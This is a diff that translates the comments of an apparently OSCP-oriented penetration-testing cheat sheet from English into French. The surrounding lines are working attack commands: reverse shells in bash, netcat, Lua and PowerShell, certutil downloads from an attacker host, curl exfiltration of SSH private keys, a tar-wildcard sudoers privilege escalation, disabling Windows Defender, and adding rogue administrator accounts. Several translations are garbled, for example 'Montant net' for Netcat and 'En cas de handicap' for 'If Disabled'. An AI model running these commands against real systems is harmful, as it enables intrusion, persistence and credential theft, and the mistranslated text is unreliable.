@@ -17,7 +17,7 @@ Commandes courantes et outils complémentaires.
 # Direct Bash reverse shell
 /bin/bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
 
-# Add the reverse shell to an existing file
+# Ajouter le shell inverse à un fichier existant
 echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file
 ```
 
@@ -28,7 +28,7 @@ echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file
 # FIFO method with Netcat
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f
 
-# Using 'sh' for reverse shell
+# Utilisation de 'sh' pour le shell inverse
 sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
 ```
 
@@ -42,10 +42,10 @@ sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
 <p class="oscp-command-note">Examiner les paramètres des certificats Windows.</p>
 
 ```bash
-# Download Netcat from a CMD
+# Télécharger Netcat depuis un CMD
 certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe
 
-# Execute the reverse shell command
+# Exécuter la commande shell inverse
 .\nc.exe 192.168.45.215 444 -e cmd.exe
 
 # (Optional) use double backslash to handling special character if it is part of an injection command
@@ -85,7 +85,7 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<
 ```
 
 
-### Netcat
+### Montant net
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -93,14 +93,14 @@ Vérifier les ports et les services de la cible autorisée.
 <p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>
 
 ```bash
-# Using -e
+# Avec l’option -e
 nc <TARGET_IP> <TARGET_PORT> -e /bin/sh
 nc -nv <TARGET_IP> <TARGET_PORT> -e /bin/bash
 
-# Without -e option
+# Sans l’option -e
 mkfifo /tmp/f; nc <TARGET_IP> <TARGET_PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
 
-# Add the reverse shell to an existing file
+# Ajouter le shell inverse à un fichier existant
 echo 'nc [lhost] [lport] -e /bin/bash' >> [file]
 ```
 
@@ -126,7 +126,7 @@ Observer les permissions et la configuration de Windows.
 # Main Option
 powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
 
-# Alternative
+# Autre
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
 ```
 
@@ -203,7 +203,7 @@ shellrator
 <p class="oscp-command-note">Script shell dans la rubrique « Adjust Interactive Shells ».</p>
 
 ```bash
-# Find terminal size (replace values with actual output)
+# Trouvez la taille du terminal (remplacez les valeurs avec la sortie réelle)
 stty size  # Example output: 50 235
 
 # Background the shell and adjust settings
@@ -213,7 +213,7 @@ fg
 export SHELL=bash
 export TERM=xterm  # Or use xterm-256color for extended color support
 
-# Set terminal size
+# Définir la taille du terminal
 stty rows <ROWS> columns <COLS>
 ```
 
@@ -235,7 +235,7 @@ bash -i
 
 
 ```text
-# Execute a new Bash shell
+# Exécuter un nouveau shell Bash
 os.execute('/bin/bash')
 ```
 
@@ -246,7 +246,7 @@ os.execute('/bin/bash')
 
 
 ```bash
-# Execute a new Bash shell
+# Exécuter un nouveau shell Bash
 perl -e 'exec "/bin/bash"'
 ```
 
@@ -274,7 +274,7 @@ python -c 'import pty; import os; pty.spawn("/bin/bash"); os.system("stty raw -e
 
 
 ```ruby
-# Execute a new Bash shell
+# Exécuter un nouveau shell Bash
 exec "/bin/bash"
 ```
 
@@ -337,7 +337,7 @@ Examiner les objets, les droits et les services du domaine.
 Examiner les objets, les droits et les services du domaine.
 
 
-### Using Credentials
+### Utilisation des pouvoirs
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -349,7 +349,7 @@ xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboa
 ```
 
 
-### Using Hashes
+### Utilisation de Hashes
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -357,12 +357,12 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 <p class="oscp-command-note">Ouvrir une session RDP.</p>
 
 ```bash
-# Using an NTLM hash.
+# Utiliser un hachage NTLM.
 xfreerdp /size:1920x1080 /v:[IP] /u:[user] /H:[hash] /cert:ignore /dynamic-resolution
 ```
 
 
-### Prompt for Credentials
+### Demande de pouvoirs
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -370,18 +370,18 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 <p class="oscp-command-note">Ouvrir une session RDP.</p>
 
 ```bash
-# Useful when GUI is required for attacks.
+# Utile lorsque GUI est nécessaire pour les attaques.
 rdesktop [IP]
 ```
 
 
-### General RDP Connect
+### Général RDP Connexion
 
 
 <p class="oscp-command-note">Ouvrir une session RDP.</p>
 
 ```bash
-# Connect with a username and password
+# Connectez-vous avec un nom d'utilisateur et un mot de passe
 xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/home/[your_username]/Desktop
 ```
 
@@ -389,12 +389,12 @@ xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/ho
 
 
 ```bash
-# Connect with specified dimensions and credentials
+# Connectez-vous aux dimensions et aux références spécifiées
 rdesktop [IP] -u [user] -p [password] -g 80%+150+100
 ```
 
 
-### Enable RDP If Disabled
+### Activer RDP En cas de handicap
 
 
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Enable RDP If Disabled ».</p>
@@ -402,12 +402,12 @@ rdesktop [IP] -u [user] -p [password] -g 80%+150+100
 ```powershell
 $ComputerName = hostname
 (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
-# If result is 1 then RDP is disabled
+# Si le résultat est 1 alors RDP est désactivé
 
-# Set the NLA information to Disabled to allow RDP
+# Définir les informations NLA à désactivées pour permettre RDP
 (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
 
-# Set the NLA information to Enabled to deny RDP
+# Définir les informations NLA pour permettre de refuser RDP
 (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(1)
 ```
 
@@ -440,9 +440,9 @@ net localgroup "Remote Desktop Users" "[domain]\[username]" /add
 
 
 ```powershell
-# This is done because if a firewall is configured, it may cause issues for our RDP
+# Ceci est fait parce que si un pare-feu est configuré, il peut causer des problèmes pour notre RDP
 
-# Get status: if True the rule is enabled and RDP should work
+# Get status: si True la règle est activée et RDP devrait fonctionner
 Get-NetFirewallRule -DisplayGroup "Remote Desktop"
 
 # Enabled if it's disabled, ensures traffic via port 3389 is not blocked
@@ -453,16 +453,16 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
 
 ```powershell
-# 1. Create the new user
+# 1. Créer le nouvel utilisateur
 New-ADUser -Name "[username]" -AccountPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force) -Enabled $true
 
-# 2. Confirm that it was created successfully (should appear in the list)
+# 2. Confirmer qu'il a été créé avec succès (devrait apparaître dans la liste)
 Get-NetUser | select cn
 
-# 3. Add user to RDP group, must be run being admin
+# 3. Ajouter un utilisateur au groupe RDP, doit être exécuté en tant qu'administrateur
 Add-ADGroupMember -Identity "Remote Management Users" -Members [username]
 
-# 4. Add user to Adinistrators group, must be run being admin
+# 4. Ajouter utilisateur au groupe Adinistrators, doit être exécuté en tant qu'administrateur
 Add-ADGroupMember -Identity "Administrators" -Members [username]
 
 # 5. Enable RDP Usage
@@ -548,7 +548,7 @@ curl -H "Accept: application/json" http://example.com
 ```
 
 
-### Data Submission
+### Présentation des données
 
 
 <p class="oscp-command-note">Envoyer une requête HTTP POST.</p>
@@ -643,7 +643,7 @@ curl -b cookies.txt http://example.com
 ```
 
 
-### File Operations
+### Opérations de fichiers
 
 
 <p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
@@ -727,7 +727,7 @@ curl -T /tmp/id_rsa http://<attacker_ip>/id_rsa
 <p class="oscp-command-note">Supprimer les fichiers indiqués.</p>
 
 ```bash
-# Remove the key files from the victim machine to avoid leaving sensitive files.
+# Supprimer les fichiers clés de la machine victime pour éviter de laisser des fichiers sensibles.
 rm /tmp/id_rsa /tmp/id_rsa.pub
 ```
 
@@ -735,7 +735,7 @@ rm /tmp/id_rsa /tmp/id_rsa.pub
 <p class="oscp-command-note">Télécharger une ressource distante.</p>
 
 ```bash
-# Replace <victim_ip> with the IP address where the private key was uploaded.
+# Remplacer <victim_ip> par l'adresse IP où la clé privée a été téléchargée.
 wget http://<victim_ip>/id_rsa
 ```
 
@@ -836,23 +836,23 @@ hostname && whoami && type [local/proof].txt && ipconfig /all
 <p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```bash
-# Example file ownership before change
+# Exemple de propriété de fichier avant changement
 ls -l id_rsa
-# Output: -rw------- 1 root root 3381 Sep 24 2020 id_rsa
+# Sortie: -rw------ 1 racine racine 3381 Sep 24 2020 id rsa
 
-# Change file ownership to a new user
+# Changer la propriété du fichier pour un nouvel utilisateur
 sudo chown <new_owner> <file_name>
 
-# Example file ownership after change
+# Exemple de propriété du fichier après changement
 ls -l id_rsa
-# Output: -rw------- 1 <new_owner> root 3381 Sep 24 2020 id_rsa
+# Sortie: -rw-------- 1 racine <new_owner> 3381 Sep 24 2020 id rsa
 ```
 
 
 
 
 ```bash
-# Add a user to a group
+# Ajouter un utilisateur à un groupe
 sudo usermod -aG <group_name> <username>
 ```
 
@@ -878,16 +878,16 @@ hashid [hash]
 <p class="oscp-command-note">Changer de répertoire.</p>
 
 ```bash
-# The idea is to have the sudoers file with this line: emma ALL=(root) NOPASSWD: ALL
+# L'idée est d'avoir le fichier sudoers avec cette ligne: emma ALL=(root) NOPASSWD: ALL
 
 cd /tmp
 touch payload.sh
 echo "echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > payload.sh # Or use nano to add the file if possible
 echo "" > '--checkpoint=1'
 echo "" > '--checkpoint-action=exec=sh payload.sh'
-# The below command is possible because we checked sudo -l and saw the permission tar for the user.
+# La commande ci-dessous est possible car nous avons coché sudo -l et avons vu le tar de permission pour l'utilisateur.
 sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
-# After this we can check with sudo -l and should see the line:     (root) NOPASSWD: ALL. The access the root shell
+# Après cela nous pouvons vérifier avec sudo -l et devrait voir la ligne: (root) NOPASSWD: ALL. L'accès au shell racine
 sudo /bin/bash
 ```
 
@@ -909,7 +909,7 @@ find [directoryPath] -maxdepth 5 -name "*.php" -exec grep -Hni "password" {} \; 
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
-# Shen found a script owned and run by root but writable for us
+# Shen a trouvé un script propriété et géré par root mais en écriture pour nous
 
 # At target machine  
 echo -n "chmod u+s /bin/bash" | base64  
@@ -928,21 +928,21 @@ echo "echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzYvODAgMD4mMQ=='|base64 
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Complémentaire Tips ».</p>
 
 ```powershell
-# Find a file
+# Trouver un fichier
 locate <FILE>
 find / -name "<FILE>"
 
-# Show Active Connections
+# Afficher les connexions actives
 netstat -lntp
 
-# List all SUID files
+# Liste tous les fichiers SUID
 find / -perm -4000 2>/dev/null
 
 # Determine version of Linux
 cat /etc/issue
 uname -a
 
-# List running processes
+# Liste des processus d'exécution
 ps -faux
 
 Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue
@@ -958,16 +958,16 @@ findstr /si password *.xml *.ini *.txt
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 
-# Disable windows defender
+# Désactive le défenseur des fenêtres
 sc stop WinDefend
 
 # Bypass restriction
 powershell -nop -ep bypass
 
-# List hidden files
+# Liste des fichiers cachés
 dir /a
 
-# Find a file
+# Trouver un fichier
 dir /b/s "<FILE>"
 ```
 
@@ -975,13 +975,13 @@ dir /b/s "<FILE>"
 <p class="oscp-command-note">Script shell dans la rubrique « Complémentaire Tips ».</p>
 
 ```bash
-# Create a new group with a specific GID
+# Créer un nouveau groupe avec un GID spécifique
 sudo groupadd -g <gid> <group_name>
 
-# Create a new user with a specific UID and GID
+# Créer un nouvel utilisateur avec un UID spécifique et GID
 sudo useradd -u <uid> -g <gid> <username>
 
-# Set a password for the new user
+# Définir un mot de passe pour le nouvel utilisateur
 sudo passwd <username>
 ```
 
